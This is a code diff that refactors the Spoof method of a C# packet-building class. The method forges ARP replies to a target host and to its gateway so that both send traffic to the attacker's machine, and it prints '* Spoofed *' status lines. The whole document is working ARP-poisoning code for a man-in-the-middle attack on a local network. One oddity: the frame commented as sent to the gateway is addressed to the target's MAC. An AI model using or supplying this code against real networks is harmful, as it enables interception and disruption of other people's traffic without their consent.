@@ -67,41 +67,51 @@ public class PacketBuild
         }
     }
 
-    public async Task Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, IPAddress gatewayIp, PhysicalAddress gatewayMac)
+    /// <summary>
+    /// Send Spoofed Arp Packet
+    /// </summary>
+    public static void Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, IPAddress gatewayIp, PhysicalAddress gatewayMac)
     {
-        // reply to the gateway
-        var arpRequestToGateway = new ArpPacket(
-            ArpOperation.Response,
-            device.MacAddress,
-            targetIp,
-            gatewayMac,
-            gatewayIp
-        );
+        try
+        {
+            // reply to the gateway
+            var arpRequestToGateway = new ArpPacket(
+                ArpOperation.Response,
+                device.MacAddress,
+                targetIp,
+                gatewayMac,
+                gatewayIp
+            );
 
-        // reply to the target
-        var arpRequestToTarget = new ArpPacket(
-            ArpOperation.Response,
-            device.MacAddress,
-            gatewayIp,
-            targetMac,
-            targetIp
-        );
+            // reply to the target
+            var arpRequestToTarget = new ArpPacket(
+                ArpOperation.Response,
+                device.MacAddress,
+                gatewayIp,
+                targetMac,
+                targetIp
+            );
 
-        // Sent to the gateway
-        var ethernetPacket = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
-        ethernetPacket.PayloadPacket = arpRequestToGateway;
-        device.SendPacket(ethernetPacket);
+            // Sent to the gateway
+            var ethernetPacket = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
+            ethernetPacket.PayloadPacket = arpRequestToGateway;
+            device.SendPacket(ethernetPacket);
 
-        // Sent to the target
-        ethernetPacket.PayloadPacket = arpRequestToTarget;
-        device.SendPacket(ethernetPacket);
+            // Sent to the target
+            ethernetPacket.PayloadPacket = arpRequestToTarget;
+            device.SendPacket(ethernetPacket);
 
-        Console.ForegroundColor = ConsoleColor.Yellow;
-        Console.WriteLine($"[{DateTime.Now}] Sent ARP reply to target: {targetIp} -> {FormattedMac(targetMac)}");
-        Console.ResetColor();
+            Console.ForegroundColor = ConsoleColor.Yellow;
+            Console.WriteLine($"[{DateTime.Now}] Sent ARP reply to target: {targetIp} -> {DeviceHelper.FormattedMac(targetMac)}");
+            Console.ResetColor();
 
-        Console.ForegroundColor = ConsoleColor.Green;
-        Console.WriteLine($"[{DateTime.Now}] * Spoofed * {gatewayIp} -> {FormattedMac(targetMac)}");
-        Console.ResetColor();
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine($"[{DateTime.Now}] * Spoofed * {gatewayIp} -> {DeviceHelper.FormattedMac(targetMac)}");
+            Console.ResetColor();
+        }
+        catch (Exception ex)
+        {
+            throw new InvalidOperationException($"[Spoof] {ex.Message}");
+        }
     }
 }
